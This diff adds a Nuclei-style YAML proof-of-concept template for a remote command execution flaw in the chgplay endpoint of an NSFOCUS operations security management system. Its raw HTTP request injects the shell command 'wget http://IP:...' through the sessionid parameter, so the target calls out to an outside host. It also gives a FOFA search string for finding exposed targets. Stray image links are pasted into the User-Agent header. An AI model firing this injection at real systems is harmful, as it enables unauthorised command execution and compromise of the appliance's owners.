@@ -1,0 +1,31 @@
+id: poc-sypgvbg4g7yprg0y
+info:
+  name: 绿盟运维安全管理系统 chgplay 存在远程命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/sypgvbg4g7yprg0y'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: sypgvbg4g7yprg0y
+    fofa: body="'/needUsbkey.php?username='"
+http:
+- raw:
+  - 'GET /webconf/log/chgplay?cat=espc&sid=7473a85e535405e7bd991cb82b2f134c&status=charset&speed=10&sessionid=;wget%20http://IP:59693/11111; HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
+
+    Connection: keep-alive
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1762685327714-52d48e6d-e333-470c-9990-01ca824a3417.png)![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1763350709363-28f179a6-7da1-4d7a-b1b5-28c8b8506a83.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
